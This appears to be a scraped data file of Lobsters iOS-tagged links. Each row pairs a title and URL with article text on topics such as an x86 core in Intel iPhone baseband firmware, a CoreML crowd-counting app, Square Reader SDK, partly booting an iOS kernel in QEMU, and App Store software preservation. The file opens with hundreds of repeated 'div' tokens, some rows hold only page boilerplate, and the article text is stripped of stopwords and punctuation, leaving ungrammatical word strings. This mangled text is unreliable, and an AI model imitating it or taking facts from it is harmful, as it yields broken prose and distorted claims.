div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div body html perform action time signed another tab window reload refresh session signed another tab window reload refresh session
184,Lobsters,ios,Apple iOS,x86 finds its way into your iPhone,https://lcq2.github.io/x86_iphone/,find way iphone,find way iphone introduction whowhatwhere old intel baseband new intel conclusion reference,find way iphone introduction one several life supposed vulnerability researcher working baseband exploitation every vulnerability researcher know date recent development utmost importance success job course apple announced new shiny big bigger biggest line iphone smartphones downloaded ota firmware ipswme started look new baseband firmware discovered sent shiver horror spine kind horror playing doom nighttime alone room without light produce bear tell note preliminary analysis going describe anything related baseband rerversing scope document whowhatwhere baseband cpu standalone core life phone responsible managing wireless communication given absurd complexity standard today baseband cpu must powerful enough general purpose day custom fpga based ip long gone least main part lot said written basebands modern smartphones repeat purpose need know usually basebands implemented using embedded friendly cpu like example arm cortexm cortexr something inbetween qualcomm hexagon kind general purpose vliw dsp le known architecture apple nothing special regard used two different basebands one cdma market one everything else cdma one based qualcomm hexagon dsp gsm one based intel xmmxxxx architecture like play around iphone firmware might seen mavxxx icexxx file ipsw well two file contain firmware respectively qualcomm based device mav intel based one ice may know apple decided drop qualcomm using exclusively intel based basebands concentrate old intel baseband let take look old generation intel baseband one used iphonex download ipsw gsm firmware unzip ipsw file zip file amongst thing firmware folder inside folder see couple file version change course io file zip file interested let unzip see content johnmacbookair ice user l al total drwxrxrx user staff sep drwxrxrx user staff sep rwr r user staff apr rwr r user staff apr rwr r user staff apr audiofwelf rwr r user staff apr debuginfoelf rwr r user staff apr infoplist rwr r user staff apr ltefwelf rwr r user staff oct optionsplist rwr r user staff apr rffwelf rwr r user staff apr sysswelf rwr r user staff apr tdsfwelf rwr r user staff apr bbcfgbin rwr r user staff apr eblbin rwr r user staff apr psirambin rwr r user staff apr restorepsibin lot stuff people familiar embedded firmware reversing set eye psirambin eblbin course quick hex dump content immediately reveal contain arm code matter fact psirambin bootloader load eblbin address jump entry point eblbin load file jump main firmware contained sysswelf sure let u fire ida open psirambin example load address matter set ea b dcd fe ff dcd stmfd sp lr fb blx ldr mov str fa blx cmp beq ldr add mov mov fa blx code xref mov add mov db fa blx adr abootrom bootrom mov fa blx mov fa blx adr apsipsistartup psi psi startup nothing strange standard embedded arm boot code custom setup related specific soc moving psiram load ebl jump find code complex important thing arm code new intel waking morning wanted analyse new baseband firmware get idea changed downloaded random ota new iphones ipswme particular http new iphone x went usual stage downloading unzipping unzipping unzipping copying load psirambin ida select arm little endian chunk undefined data press c like idiot time reload file multiple time try another ida version try disassemble byte capstone disassemble manually got invalid code went back sleep obviously good day wake hour download ipsw model go step usual still invalid code first guess code encrypted use random tool analyse entropy nothing low ok trust tool day wrote script calculate entropy low encrypted anyway also clear quick eye analysis even though trust eye much stare screen several minute thinking fu going course reverser never give try every possible risc architecture know trust lot mean lot reversed everything dreamcast fujitsusiemens running inside nikon nothing get garbage next guess ok encrypted entropypreserving algorithm try cryptoanalisis approach know even though main job expert still nothing make another coffee start think mind joke fuck intel gone insane start laugh maniacally idea know tried everything reopen psirambin leave default metapc architecture ida proc near code xref dword ptr push esi mov eax lea edx push push edx push call add esp pop ecx retn endp could believe looking embedded code running inside baseband processor thought random chance somehow ended valid code look another function note ida automatically resolved code proc near code xref dword ptr mov eax lgdt fword ptr eax mov ax mov d eax assume d nothing mov e eax assume e nothing mov s eax assume s nothing mov ax mov g eax assume g nothing jmp far ptr endp holy sh d far ptr xxx get coincidence must valid totally speechless partially awe reminds younger day writing bootloaders operating system run protected mode rational part told hey probably decided boot system embedded mcu obviously main firmware still run arm turn attention sysswelf main firmware look elf header say load ida get think whatthefuck try load metapc valid code random snippet proc near code xref push esi push edi push ebx push ebp mov edi cmp edi lea eax edi mov esi eax mov ebp jb short push pop eax jmp short conclusion nothing really found funny wanted share ever felt like missed core life one several still need investigate always feel alone ever still time analyse model guess also running happen next going get inside phone hell would love run basic interpreter natively inside really criticizing apple intel using core really care personal opinion something going really wrong world reference thing may find useful subject particular order
185,Lobsters,ios,Apple iOS,Building a Shake Shack crowd-counting app with CoreML,https://blog.floydhub.com/humans-of-ml-dimitri-roche/,building shake shack crowdcounting app coreml,live webcam shack cam devastated many lunch hour count multiscale convolutional neural network floydhub cloud gpu machine porting count run natively io device coreml love crowd counting project perfect blend cool new technology something practical real world tell longest ever waiting line shake shack goto shake shack order led think deep learning approach could help solve problem thought merchant exactly crowdcounting model work multiscale convolutional neural network mean let try question redditstyle explain like five crowdcounting app work biggest challenge faced developing original crowd counting model dig coreml version followup question surprised mention data annotation data processing data version control n overall challenge let u know handled data pipeline project head annotator count git lf shared model shake shack thinking adding official sha ck cam site please say yes let change gear recent work porting crowd run mobile device model local device mentioned part trend called edge ai explain edge ai bit pro con running model device versus cloud using apple coreml mlkit library going blog thinking porting android well flutter realworld usecases mobile device model looked app io app store see yet plan release crowd app store count publicly available people reproduce http githubcomdimroccount hoping learn tackle next lip reading sentence wild advice people want get started deep learning programming let pretend danny meyer u anything want say special request new burger shake option people go learn work twitter github experiment,dimitri roche software engineer based new york city path first aligned based mutual love shake shackif yet familiar shake shack tasty burger chain founded hospitalityguru danny meyer praised juicy burger crispy fry malty shake shake shake perhaps best known infamously long line flagship madison square park location check live webcam believe forgetting check shack cam devastated many lunch hour nyc flatiron office dwellersa grim scene shack cam last year dimitri decided make thing little better fellow new yorkers deep learning released count dynamic crowdcounting app based multiscale convolutional neural network trained floydhub cloud gpu machine using livestream data shack camrecently dimitri busy porting count run natively io device realtime crowddetection using apple coreml mlkit framework count iphone x using coremlwe sat dimitri chat shake shack challenge opportunity edge ai get started deep learningi love crowd counting project perfect blend cool new technology something practical real world tell longest ever waiting line shake shack least thirty minute madison square park worth itwhat goto shake shack order used double cheeseburger side cheese fry bad vegan get single cheeseburgerwhat led think deep learning approach could help solve problem deep learning excels taking fuzzy input answer specific question collaborating steve berry thought merchant wanted create fun proofofconcept product emerging technology given shake cam fixed camera consistency backdrop thought would translate well ml domain steve thought could interesting brand set answer question many people line exactly crowdcounting model work quickly realizing shelf object detection work due dense crowd get started reading white paper crowd counting settled multiscale convolutional neural network feed image multicolumn convolutional neural network cnn map head density heat map sum pixel final size crowdthe sum pixel value size crowdthe next subtle problem need solved separating size line size whole crowd mean people sitting eating longer line need excluded another fuzzy input scenario solved second neural network two dense layer trained heatmap exclude people contiguous series dot front line let try question redditstyle explain like five crowdcounting app work app count creates heatmap head present absent add pixel image get total size crowd crowd figure many people actually waiting seeing dot make solid line count pixelswhat biggest challenge faced developing original crowd counting model getting model converge run away predict gibberish trust mean squared error alone would seemingly get lower undesirable way would leave blank image eventually stall mitigated generating picture prediction every epoch see progress actually madeif include core ml version count handling wildly different input crowd density stretched input past fuzzy made prediction challenge single model opted create ml pipeline classified crowd either single ten hundred used model tailored scenarioscoreml pipeline crowd image classification determines counting model usebefore dig coreml version followup question surprised mention data annotation data processing data version control overall challenge let u know handled data pipeline project well solved annotation problem throwing money ducttaped together head annotator crowd sourced work amazon mechanical turkhead annotation built top amazon mechanical turkit expensive annotating thousand image certainly want definitely worth start reluctant spend money annotation count running proof conceptas data versioning used git lf store data appreciated floydhub automatic data versioning keep track model used data proper ml shop relatively fixed model churn data squeak better accuracy since proof concept oneman shop experimented layer model le training data take next level data versioning would critical would training model architecture parallel different datahave shared model shake shack thinking adding official shack cam site please say yeshaha week count amazingly accurate week like snowy dark one model cough weird numbersknowing count still susceptible edge case made reserved publicizing main motivation learn fun way everything else welcome bonuslet change gear recent work porting crowd run mobile device model local device mentioned part trend called edge ai explain edge ai bit dealing network term edge used describe machine closest request example cdn edge server server closest client borrowing term edge ai describes scenario neural network ai running local device like phone opposed server cloudwhat pro con running model device versus cloud lot pro improved privacy big advantage running model locally longer need upload potentially sensitive information intelligent answerin scenario involving real time interaction reduce latency improve responsiveness needing connect serveroffloading processing phone reduce server infrastructure cost developerscons unforgiving battery consumptionlimited gpus limit model complexity performanceyou using apple coreml mlkit library going core ml pretty pleasant using kera coremltools covered scenario nuance dealing variable sized input discus blog people convert kera core ml coremlmodel coremltoolsconverterskerasconvert path inputnames imageinputnames outputnames densitymap coremlmodelsave crowdpredictormlmodel drag drop new file xcodemy next project involve sequence recurrent neural network rnns framework limited capability field see happensare thinking porting android well wanted cover android thought using flutter need stay native ml could take much time endeavor focused edge ai learned lot itwhat realworld usecases mobile device model stadium could count number people attendancebusinesses could tie po figure time peak demand hire accordinglyi looked app io app store see yet plan release crowd app store us io beta core ml available around september perhaps release itis count publicly available people reproduce yes available http githubcomdimroccount hoping learn tackle next hopping recurrent neural network rnn train looking speech recognition specifically lip reading sentence wildany advice people want get started deep learning programming take andrew ng coursera course already knee deep data science step jupyter notebook make something work end endlet pretend danny meyer u anything want say special request new burger shake option pretty happy classic really treat cow well feel bad eating themwhere people go learn work feel free follow twitter github experiment site
186,Lobsters,ios,Apple iOS,On ‚ÄòShake to Undo‚Äô,https://daringfireball.net/2018/08/shake_to_undo,shake undo,shake undo jeff carlson twitter yesterday scott knaster io io,shake undo thursday august jeff carlson twitter yesterday many year shaketoundo still one worst stupidest idea io scott knaster jeffcarlson yes weird littleknown ui recently saved family member ton lost work told shake like polaroid picture thought kidding worked ecstatically happy fact systemwide undo exists io great android shake gesture dreadful impossible discover exploration onscreen ui bad accessibility risk phone flying hand many io user even know shake undo suspect ipad little better undo button keyboard screenshots io io button work text editing scenario text editing may well common task undo used still fall short mac ever since single standard universally available edit undo menu command standard keyboard shortcut undo universal consistent window well use shortcut io hardware keyboard connected especially iphone rare clear io apps sort counterclockwise circular arrow button something like toolbar floating button undo nontextediting action universal far consistent lot little thing like io tricky problem implement universal undo without menu bar without keyboard shortcut even cutcopypaste tricky enough took io iphone get menu bar keyboard shortcut essential element mac experience shake undo problematic enough think apple figured something better iphone accessibility reason turn shake undo undo best suggestion would take away space autosuggestion row keyboard put undo button left like ipad lastly anecdote heard year ago shake undo came scott forstall charged io team devising interface undo everyone knew iphone one good idea one engineer joked could make shake iphone invoke forstall said loved idea proposed joke u undo interface ever since
187,Lobsters,ios,Apple iOS,Path to EL1 in iOS 11,https://docs.google.com/presentation/d/16LZ6T-tcjgp3T8_N3m0pa5kNA1DwIsuMcQYDhpMU7uU/edit#slide=id.p,path io,,javascript nt enabled browser file ca nt opened enable reload
188,Lobsters,ios,Apple iOS,Introducing Square Reader SDK,https://medium.com/@gjinich/introducing-square-reader-sdk-939a9ec2d197,introducing square reader sdk,introducing square reader sdk integrated inperson payment solution android io developer using square hardware http developersquareupcomblog square developer point sale api square reader sdk work add sdk documentation developer dashboard authorize sdk connect square reader contactless chip reader accept form payment learn shake shack fuzz infinite peripheral clover food lab acuity scheduling quiqmeds square reader sdk,introducing square reader sdkan integrated inperson payment solution android io developer using square hardwareheads moved like continue keeping latest technical content square please visit u new home http developersquareupcomblogit two year since introduced square developer platform empowers developer build custom solution square seller since developer used point sale api build custom solution used thousand seller leveraging square hardwarewhile developer love relying square securely manage complexity payment heard open square point sale app via api always ideal example difficult manage two different application building selfcheckout kiosk solution hard manage authentication two separate apps size deployment scaleswe listened feedback today thrilled announce launch square reader sdk developer use square hardware accept inperson payment directly within application appswitch required line code quickly add emv pcicompliant inperson payment android io app square reader sdk allows engineer zero knowledge payment build secure compliant solution hardware talking apps let developer good square good adam mack lead system architect fuzz production developer shake shack kiosk worksreader sdk enables io android developer easily build inperson payment solution using square platform affordable easytoget hardware developer add sdk project morning purchase square reader lunch take first pci emvcompliant card payment afternoon sort magical instant spend time talking interesting stuff instead worry payment work jenny zhao director digital marketing clover food labsadd sdkit easy get started reader sdk simply visit documentation site learn head developer dashboard request access sdk repositoryauthorize sdkwhether deploying device easy authorize application take payment behalf square seller server call mobile authorization api sends resulting authorization code client us authorize sdksquareupcommobileauthorizationcode authorizationcode yourmobileauthorizationcode expiresat connect square readerreader sdk designed work square beautiful reliable affordable hardware including contactless chip reader provide user interface help seller pair card reader ensure uptodate firmware help troubleshoot connectivity issuesaccept form paymentreader sdk make easy accept major credit card nfc payment inperson checkout flow emvcompliant used million square seller buyer across globe also provide powerful checkout configuration parameter configure checkout flow suit needslearn moredozens developer participated beta program built powerful custom solution using reader sdk example shake shack fuzz built selfservice kiosk application streamline ordering process allowing employee engage customersinfinite peripheral built ezmetr nextgeneration digital taxi meter currently used taxi throughout washington dc take card paymentsclover food lab built custom point sale system update menu twelve location real time accommodate everchanging menuacuity scheduling added inperson payment small business scheduling solution customer keyin card number lower rate cardpresent paymentsquiqmeds built platform allows point care also function pharmacy patient get medication end doctor visitvisit square reader sdk documentation site get started wait see build
189,Lobsters,ios,Apple iOS,"Full-Stack Haskell, from Prototype to Production",https://www.youtube.com/watch?v=riJuXDIUMA0,fullstack haskell prototype production,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature yow lambda jam ryan trinkle fullstack haskell prototype production yowlambdajam youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature yow lambda jam ryan trinkle fullstack haskell prototype production yowlambdajam youtube
190,Lobsters,ios,Apple iOS,Almost booting an iOS kernel in QEMU,https://worthdoingbadly.com/xnuqemu/,almost booting io kernel qemu,introduction part sign email completely useless corelliumhq corellium initial research iboot kernelcache xnu iemu open source qemu chameleon grub genericbooter loading kernel qemu io beta update iphone x one apple simple familiar macho file devkitpro kernel entry point tweaking cpu emulation part mistral commented error try read boot argument providing boot args bootargs struct requested allocates initial page table directly another file showed fixed loading device tree device tree linux arm platform write script tweaking cpu emulation part modified qemu cpu selection code getting serial port output standardized added exynos serial port next learned,tried boot io kernelcache qemu managed get far iokit startup receiving kernel panic learned lot io boot project introduction part series io boot process part sign email first read new post let get obvious way first completely useless want run io ask corelliumhq instead buy iphone wanted learn io start modern io device jailbroken already booted corellium built service simulates entire virtual iphone bootup process almost impossible get invite thought hard boot tiny bit io emulator corellium prof possible decided try goal boot enough io receive kernel panic crash log three day work got io print crash virtual iphone virtual serial port iboot version corecryptokextstart called fipspostkext passed m fipspostpostintegrity fipspostkext passed m fipspostposthmac fipspostkext passed m fipspostpostaesecb fipspostkext passed m fipspostpostaescbc fipspostkext passed m fipspostpostrsasig fipspostkext passed m fipspostpostecdsa fipspostkext passed m fipspostpostecdh fipspostkext passed m fipspostpostdrbgctr fipspostkext passed m fipspostpostaesccm fipspostkext passed m fipspostpostaesgcm fipspostkext passed m fipspostpostaesxts fipspostkext passed m fipspostposttdescbc fipspostkext passed m fipspostpostdrbghmac fipspostkext test passed m panic cpu caller kernel data abort saved state fp lr sp pc cpsr esr far real io beta code printing crash bit work confident get boot initial research research already know iphone start bootrom burned cpu chip load iboot bootloader iboot load kernelcache file bundling xnu io kernel core operating system together kernel device driver kernel load rest operating system component decided boot xnu kernel directly emulator bypassing iboot previous io emulation effort iemu team later made corellium try emulate iboot simpler understand io kernel time however iboot closed source xnu open source addition obtain iboot one need jailbroken device kernel unencrypted obtained update ipsw file therefore actually easier obtain understand kernel chose modify qemu experiment since standard open source virtual machine great support processor finally decided look apple open source code possible open source bootloaders start xnu like chameleon grub winocm genericbooter look since wanted get information first hand instead relying people research fun way loading kernel qemu first needed copy io kernel downloaded io beta update iphone x plenty tutorial online like one extracting kernel ipsw file followed one got macho executable file learn load macho file memory consulted apple turn loading kernel simple segment convert virtual address physical address masking top bit copy data memory physical address already familiar macho file easy port logic qemu already support loading linux kernel directly loading kernel buffer registering buffer rom emulation buffer copied correct address virtual device boot load macho file segment buffer register like linux boot code implemented kernel loading tried starting qemu kernelcache virt cpu max kernel kcacheoutbin dtb devicetreedtb monitor stdio unimp int serial file devstdout serial file devstdout serial file devstdout append note passed unimp int print unimplemented cpu special register every processor exception find kernel crashing also passed enable gdb support pause startup attach attached gdb devkitpro started execution gdb target remote remote debugging using warning executable specified target support determining executable automatically try using file command gdb c qemu promptly exited error write access unsupported system register good news single stepping gdb see happens already entered kernel entry point ran tiny bit io already tweaking cpu emulation part qemu emulates cpu control register iphone x custom mistral cpu make qemu ignore invalid register write searched error message commented error fixing kernel crash data abort exception printed qemu console try read boot argument well duh provide yet trying load null pointer providing boot args xnu need boot argument find kernel loaded much memory system bootargs struct well documented apple created populated bootargs structure registered qemu rom like kernel qemu copy emulated device memory passed address requested startup got bit confused put boot argument memory originally put kernel got overwritten boot code examining early boot code turn kernel allocates initial page table directly end kernel overwriting boot argument another file showed fix extend topofkerneldata address bootargs include extra data boot argument get overwritten fixed kernel actually booted c code crashed yet another null dereference exception examining qemu log data abort exception cross referencing using hopper found crashed peidentifymachine function read device tree provide yet loading device tree io us device tree data structure containing list device address kernel know access device soc concept later adopted linux arm platform device tree also contained ipsw update file initially loaded device tree kernel crashed immediately placing breakpoint panic gdb saw kernel expected iboot populate field device tree bypassing iboot write script populate timer frequency early random seed device tree loading modified device tree memory yet another qemu rom kernel dy invalid instruction exception tweaking cpu emulation part offending instruction turned stadd instruction introduced qemu full system emulation mode emulates support however instruction enabled user mode emulation mode modified qemu cpu selection code enable feature full system emulation mode well kernel crash bunch repeated data abort placing breakpoint panic became clear panic crashing ignoring later panic found first panic happens kernel kext loading code try bzero newly allocated buffer good seems kernel already trying load kexts mean gotten quite far boot process able output information serial port getting serial port output point output virtual device qemu log message gdb breakpoints however goal get io kernel print error serial port device tree loaded serial port initialization code io work need emulate serial port correct address obviously qemu support iphone x booting kernel using qemu virt machine type peripheral completely different incompatible early boot two device need work properly timer serial port timer standardized across cpu serial port must implemented debug output turn qemu already support emulating iphone serial port thanks quirk history modern iphones still use serial port design compatible first iphones used samsung cpu change work serial port design samsung used cpu starting way latest exynos cpu qemu support emulating simply added exynos serial port virt machine got output serial port next diagnose kernel crash data abort exception need understand memory mapped io need add command qemu dump cpu pagetables done able figure memory allocation fails get kernel boot bit next goal start launchd virtual iphone probably going take much longer three day definitely learn even io arm qemu learned io boot modify qemu load code directly memory value debugger board bringup emulator single step examine register set breakpoints get output even serial port working meanwhile tried lowlevel bringup nexus way check code actually running adding reboot command wonder developer board include jtag support support level debugging emulator
191,Lobsters,ios,Apple iOS,App Preservation: Saving the App Store‚Äôs History,https://www.macstories.net/stories/app-preservation-saving-the-app-stores-history/,app preservation saving app store history,zach gage preview video interview podcast appstories unify award app store developer page zach gage ridiculous fishing really bad chess flipflop solitaire app store story apple sage solitaire early work phil schiller tenure spam clone apps apple crackdown legacy software app store shrunk first time tenth anniversary app store update culture wikipedia neatly sum library burn legislation super mario kart required came required new apps app update september told developer confirmed announced warning completely dropped support legacy apps started requiring comply economic reality app maker face every day new app apple opened developer officially part system tweetie created loren brichter decision controversial time opted selling major update new skus looking time internet archive classic macintosh software library launched apps day one museum modern art moma applied design exhibition announced museum acquired selection videogames vibribbon flow canabalt paul galloway link past seganintendo console war proven criticized launching later year classic edition unofficial emulator namco sega digital eclipse street fighter anniversary collection criterion collection snk anniversary collection emulate peculiar rotary joystick noted interview gdc talk internet archive made case internet arcade joust run defender paperboy playstation rumored backwards compatibility game boy advance player fan reaction microsoft announcement actually improved io like microsoft unity ported monument valley hidden folk introduced fallout shelter limited run game satellaview lost game mame tap tap revenge rolando series flight control original bioshock doublefine dropchord lost history game service trend duck hunt app store anniversary coverage console counterpart,app store turned one sometime summer concept artist game developer zach gage published preview video iphone game working game based simple premise gage girlfriend liked playing tetri iphone thought rushed adaptation console game take advantage iphone unique hardware looked gage told interview podcast appstories thought make better game spare time different project got work game launched fall called unify website gage described touchtetris side brain unify see trait would define gage later work app store game take wellknown concept add twist block come side screen rather falling top classic tetri graphic minimal instantly recognizable somewhat cute simplicity unify entirely controlled via touch eschewing kind consolelike onscreen control trying imagine tetri would look like game designed multitouch gage added kind got hooked kept making game unify element ideal app store origin story basic preview video uploaded vimeo year ago youtube became defacto standard videogame trailer independent artist game developer year later would win award innovation mobile gaming funny backstory stem big publisher inability adapt console game touchscreen decade ago think unify would make perfect case study app development mobile creativity historic purpose except unify gone app store never existed first place look app store developer page zach gage worked awardwinning ridiculous fishing released indie breakthrough really bad chess flipflop solitaire even profiled app store story apple see sage solitaire app store debut unless still old iphone never updated io gage early work playable anymore remains old review gaming blog awkward gameplay video recorded youtube let play memory playing unify old io device updated io credit stephen hackett story unify emblematic bigger change app store one considered problem cultural level others simply ascribe evolution app store digital marketplace past two year phil schiller tenure apple cleaning app store ridding spam clone apps outdated abandoned software category apps company see fit platform anymore unify thousand older io apps game purged part apple crackdown legacy software io last year company began preventing apps updated device launched altogether thus rendering apps still installed user device useless process apple forcibly remove apps app store made noninstallable user showing message product page explained app downloaded anymore however avoid explaining customer app could installed older device running io several developer simply went ahead removed apps app store intention updating anymore others like gage left older lite ie free version store result technical cleanup app store shrunk first time according stats shared analytics firm appfigures around apps two million lost october late people would sad favorite fart app never updated got nuked io true pioneering title essential writing history app store topic software preservation addressed industry apple largely ignored conversation treating apps equal commodity spite fundamental role played history app store art gameplay design ultimately culture tenth anniversary app store looking ahead app store next year feel like discussion worth update culture digital preservation often get thrown around esoteric concept activist care reality much simpler wikipedia neatly sum digital preservation practice ensuring digital information continuing value remains accessible usable certain historian strive preserve precious manuscript old book digital archivist poured year effort allowing notable piece software stand test time conserving analog document artifact mostly concern physical aspect degradation preservation ensuring paper survive multiple century library burn preserving software involves trickier challenge everchanging technical standard programming language legal hurdle may range copyright dispute new legislation intangibility software biggest strength everyday usage apps web service game easily available anywhere time preservation standpoint though also weakest point failure scenario app store squarely odds software preservation effort apple structured year ago operates day first foremost even though apple invent idea digital marketplace manages user purchase periodic software update app store established superior framework others copy two million apps available user download app store epitomizes modern digital distribution scale undeniable app store influenced directly shaped digital shopping experience like google microsoft sony nintendo one app store core principle take granted today fact every app download version specific point time unlike say snes cartridge super mario kart street fighter arcade cabinet late app constantly evolving product change rapidly time across multiple version support different device introduce new feature alter gameplay mechanic videogame company still straddle line selling physical copy game often require digital patch update app store never offered physical counterpart apps begin preserve app begs fundamental question iteration archived posterity charge alongside approach apple relentless push new technology forced company regularly increase compatibility threshold apps receive update remain app store past year apple often tied new app requirement new hardware feature specific device o update way app store digital representation apple evolving product line example apple required new app submission include retina screenshots app store product page pushing developer support highresolution display iphone came following year december apple required new apps app update submitted app store built latest version xcode support io sweeping redesign o launched public september year later company told developer would require new apps compiled io include support february month later confirmed existing apps also needed support architecture june wanted receive future update iphone first iphone deliver soc come two year prior hundred apps still available app store longer installed io last year apple announced major app store cleanup initiative get rid outdated apps following numerous warning company completely dropped support legacy apps year apple started requiring new apps submitted app store built io support iphone x super retina display including universal apps sometime later month app update submitted app store comply requirement important note apple approach although justified fast innovation pace mobile device commitment provide great app store experience customer created modern expectation downloading app thinking supported forever think many time heard friend relative bought app four year ago upset eventually stopped working update culture permeates digital life today accelerated smartphones long clashed economic reality app maker face every day year apple asking developer keep updating apps support new version io new display resolution giving enough tool turn apps sustainable business could justify ongoing development throughout year new app app store never supported free trial traditional sense inapp purchase never great solution business model based recurring revenue apple opened autorenewing subscription developer long app maker lamenting burden supporting app forever failing make money across several year result subscription allowing developer support app time today free trial officially part system app store always like creates fundamental problem debating mobile app preservation compensate lack flexible purchase mechanism early day app store developer came idea instead update app forever without getting paid could release major update brand new separate version app store charge technique allowed apple give developer alternative upgrade pricing another common strategy shareware world never translated app store new economy tweetie groundbreaking twitter client created loren brichter widely regarded pioneer concept brichter ready release version app late decided sell separate paid upfront app store decision controversial time became common practice indie developer community intervening year reeder omnifocus tweetbot fantastical hundred developer highprofile apps utility apple also celebrated design award opted selling major update new skus eventually phasing old version initial grace period developer want use inapp purchase subscription still easiest way ensure app profitable time way selling software app store enabled several solo developer small shop keep producing apps also substantially complicated discussion whether apps ie nongame apps ought preserved could even possible think preservation generally think museum collect conserve artwork tool still exist apps nothing like digital often updated change alter original functionality prevent running modern hardware visit louvre worry version mona lisa looking physical artwork requires actual change work restoration strive close original version possible least time preserve original tweetie one apple legacy io apps version apps try immortalize time perhaps thirty year someone decides offer equivalent internet archive classic macintosh software library io apps ever able retrieve version apps pulled developer app store make room new skus would old version even work answer thing stand today likely apple never addressed preservation old apps ever offered tool emulate old apps download specific release app store server internet archive classic macos library feature title application game app store launched apps day one year ago feature million unless apple invests serious time effort preserving history app update apps longer app store extremely difficult anyone even preserve small segment app store catalog future interaction archival purpose whether created big company indie developer apps tend disposable utility updated frequently often removed app store financial technical reason run closedsource signed firmware installed apple device think decade entire history app store preserved straightup utopia perhaps way reconcile traditional preservation occurs museum library cataloguing archiving history app store museum necessarily preserve every single object ever produced human history research select preserve subset valuable item curate museum modern art moma time exactly approached digital preservation game applied design exhibition ran march january section moma applied design exhibition photo courtesy moma late paola antonelli senior curator moma department architecture design announced museum acquired selection videogames like object moma collection offered combination historical cultural relevance aesthetic expression functional structural soundness innovative approach technology behavior successful synthesis material technique achieving goal set initial program game featured initial collection included classic pacman tetri also bold audiovisual experiment like vibribbon flow simulation like sims simcity even infinite runner canabalt time widely known iphone game besides decision treat videogames culturally relevant design artifact moma strategy preservation fascinating well starter museum digital conservation team obtained copy original software whether cartridge disc hardware sought acquire source code game collection backup whenever possible corroborating technical documentation annotated report game code creator given different nature game immediate gameplay katamari damacy multiplayer world eve online moma created adhoc demo guided tour allow visitor experience game understand design minute necessary recreated essence game staying true original asset mechanic given lack io emulation tool moma preserved original flash version canabalt photo courtesy moma able talk paul galloway collection specialist moma department architecture design applied design exhibition museum approach software preservation large subject one devoting lot resource galloway told email committed preserving work software come moma collection whether website app video game added course given abundance interesting digital content available web mobile app store today moma update conservation strategy accordingly preserving video game different preserving artistic interactive installation website galloway noted conversation select work collection way select painting artwork carefully great deliberation moma organization resource prestige hobbyist conservation effort recognizes challenge digital preservation opted selective deliberate approach perhaps attempting preserve every version every app ever released indeed foolish proposition maybe archiving preserving history app store follow principle moma going forward find way curate establish practice save limited selection title representative human creativity interaction design expressed touch screen turn consideration lot folk videogame industry pondering long time link past videogame industry know around four decade point easy understand videogame company big small increasingly thinking new solution preserve history nostalgia effect gamers kid golden day atari console ne seganintendo console war proven revenue generator even today despite archaic graphic trite plot fun old game timeless game publisher reissuing old title modern console often feel like free money opportunity ask nintendo long criticized rereleasing super mario bros multiple iteration virtual console year announce yet another old game emulation service launching later year older videogame industry grows look inward turning nostalgia easy cash flow nintendo upcoming switch online service include selection ne game think preserving old console game think nintendo aforementioned fragmented virtual console effort perhaps nintendo relatively new classic edition line small retro console unofficial emulator developed enterprising fan maybe collection company namco capcom sega released past several year standalone playable compendium part though initiative emulation giving player legal way replay old title digital eclipse belief true preservation medium requires deeper commitment painstaking study game history reopened independent entity spun backbone entertainment digital eclipse american videogame studio whose mission preserve classic game something packaging basic emulator founded mike mika frank cifaldi andrew ayre digital eclipse specialized creating meticulous anthology popular game addition faithfully representing game might looked crt monitor feature digital museum filled concept artwork development notebook special challenge mode soundtrack previously unreleased memorabilia pay homage historical nature 